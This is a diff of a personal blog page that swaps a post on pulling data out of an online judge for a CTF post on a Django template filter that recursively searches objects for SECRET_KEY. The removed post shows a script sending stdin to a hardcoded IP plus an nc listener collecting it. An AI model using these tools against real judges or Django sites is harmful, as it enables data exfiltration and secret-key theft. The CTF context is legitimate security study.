@@ -5,19 +5,15 @@
     <meta charset="UTF-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
     <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>在线oj获取数据 - oxcccccc</title>
+    <title>django快速查找配置 - oxcccccc</title>
     <meta name="apple-mobile-web-app-capable" content="yes" />
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="google" content="notranslate" />
     <meta name="keywords" content="ccreater,"> 
-    <meta name="description" content="在线oj获取数据python3:
-import socket
-import sys    
+    <meta name="description" content="django快速查找配置脚本在看p牛的picklecode wp的时候卡在secret_key查找那边
+看到p牛一句很容易,人就傻掉了
 
-ip = &amp;#39;39.108.164.219&amp;#39;
-port = 60000
-
-def send,"> 
+花了一天时间(踩了个坑),写了个快速查找secret_key,"> 
     <meta name="author" content="ccreater"> 
     <link rel="alternative" href="atom.xml" title="oxcccccc" type="application/atom+xml"> 
     <link rel="icon" href="/img/favicon.png"> 
@@ -65,7 +61,7 @@ def send,">
     <div class="navigation animated fadeIn fast delay-1s">
         <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="https://explorersss.github.io">
         <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
-        <h3 class="subtitle">在线oj获取数据</h3>
+        <h3 class="subtitle">django快速查找配置</h3>
         <div class="social">
             <!--        <div class="like-icon">-->
             <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
@@ -95,25 +91,25 @@ def send,">
         <div class="else">
             <p class="animated fadeInDown">
                 
-                <a href="/categories/杂"><b>「
-                    </b>杂<b> 」</b></a>
+                <a href="/categories/web"><b>「
+                    </b>WEB<b> 」</b></a>
                 
-                December 15, 2019
+                December 21, 2019
             </p>
-            <h3 class="post-title animated fadeInDown"><a href="/2019/12/15/%E5%9C%A8%E7%BA%BFoj%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE/" title="在线oj获取数据" class="">在线oj获取数据</a>
+            <h3 class="post-title animated fadeInDown"><a href="/2019/12/21/django%E5%BF%AB%E9%80%9F%E6%9F%A5%E6%89%BE%E9%85%8D%E7%BD%AE/" title="django快速查找配置" class="">django快速查找配置</a>
             </h3>
             
             <p class="post-count animated fadeInDown">
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>Words count</i>
-                    997
+                    2.5k
                 </span>
                 
                 
                 <span>
                     <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
-                    1 mins.
+                    2 mins.
                 </span>
                 
                 
@@ -126,7 +122,7 @@ def send,">
             </p>
             
             
-            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li></ul>
+            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/django/" rel="tag">django</a></li><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li></ul>
             
         </div>
     </div>
@@ -147,38 +143,50 @@ def send,">
 <div class="article">
     <div class='main'>
         <div class="content markdown animated fadeIn">
-            <h1 id="在线oj获取数据"><a href="#在线oj获取数据" class="headerlink" title="在线oj获取数据"></a>在线oj获取数据</h1><p>python3:</p>
-<pre><code class="python">import socket
-import sys    
+            <h1 id="django快速查找配置"><a href="#django快速查找配置" class="headerlink" title="django快速查找配置"></a>django快速查找配置</h1><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p>在看p牛的picklecode wp的时候卡在secret_key查找那边</p>
+<p>看到p牛一句很容易,人就傻掉了</p>
+<p><img src="https://i.loli.net/2019/12/21/8mnp5l7ODuPkBQo.png" alt="image152"></p>
+<p>花了一天时间(踩了个坑),写了个快速查找secret_key的脚本</p>
+<pre><code class="python">from django.http.response import HttpResponse, HttpResponseRedirect
+from django.template import engines
+from django.contrib.auth import login as auth_login, get_user_model, authenticate
+from django.contrib.auth.views import LoginView, logout_then_login
+from django.contrib.auth.decorators import login_required
+from django.views import generic
+from django import template
 
-ip = &#39;39.108.164.219&#39;
-port = 60000
+import django
+from django import template
+register = template.Library()
 
-def send_raw(raw):
+@register.filter
+def get_dict(obj,way=&quot;&quot;,depth=0):
+    if depth&gt;11:
+        return 
+    objdir=dir(obj)
+    r={&quot;dict&quot;:objdir,&quot;way&quot;:way}
+    result=&quot;&quot;
 
-    try:
-        with socket.create_connection((ip, port), timeout=10) as conn:
-            conn.send(bytes(raw,encoding=&quot;ascii&quot;))
-            conn.close()
-    except:
-        return False  
-    return True
+    for i in objdir:            
+        try :
+            if &#39;_&#39; == i[0]:
+                continue
+            if getattr(obj, &#39;__module__&#39;, None)!=None and getattr(obj, &#39;__module__&#39;, None).split(&#39;.&#39;)[0] == django.__name__:
+                result+=get_dict(getattr(obj,i,None),way+&quot;.&quot;+i,depth+1) 
+        except TypeError:
+            pass
 
-data=&quot;&quot;
-for line in sys.stdin:
-    data+=line
-send_raw(data)
-</code></pre>
-<p>vps上运行</p>
-<pre><code class="shell">#!/bin/bash
-i=1
-while [ $i -eq 1 ]
-do 
-     nc -FNlp 60000  &gt;&gt; /tmp/data
-    echo -e  &quot;\n---------------------------------\n&quot; &gt;&gt; /tmp/data
-done
-</code></pre>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://explorersss.github.io/2019/12/15/在线oj获取数据/">https://explorersss.github.io/2019/12/15/在线oj获取数据/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+    if &quot;SECRET_KEY&quot; in objdir or &quot;settings&quot; in objdir:
+        print(way)
+        return result+way+&quot;\n&quot;
+    return result</code></pre>
+<p>这个是把所有符合条件的都输出,你可以通过修改递归深度和返回条件来加快,不然要等个几分钟</p>
+<h2 id="顺便说下踩到的坑"><a href="#顺便说下踩到的坑" class="headerlink" title="顺便说下踩到的坑"></a>顺便说下踩到的坑</h2><p>因为不知道dir()和<code>__dict__</code>的区别,一直以为<code>__dict__</code>==dir,然后就boomm</p>
+<p>dir()和<code>__dict__</code>的区别</p>
+<p>最简单的一句发\话是<code>__dict__</code>是dir的子集合</p>
+<p> <a href="https://stackoverflow.com/questions/13302917/whats-the-difference-between-dirself-and-self-dict/13302981#13302981" target="_blank" rel="noopener">https://stackoverflow.com/questions/13302917/whats-the-difference-between-dirself-and-self-dict/13302981#13302981</a> </p>
+<p>所以以后查看对象的所有属性一定要用dir()</p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://explorersss.github.io/2019/12/21/django快速查找配置/">https://explorersss.github.io/2019/12/21/django快速查找配置/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls"
@@ -237,7 +245,7 @@ done
             <div class="box sticky animated fadeInRight faster">
                 <div id="toc" class="subbox">
                     <h4>Contents</h4>
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#在线oj获取数据"><span class="toc-number">1.</span> <span class="toc-text">在线oj获取数据</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#django快速查找配置"><span class="toc-number">1.</span> <span class="toc-text">django快速查找配置</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#脚本"><span class="toc-number">1.1.</span> <span class="toc-text">脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#顺便说下踩到的坑"><span class="toc-number">1.2.</span> <span class="toc-text">顺便说下踩到的坑</span></a></li></ol></li></ol>
                 </div>
             </div>
             
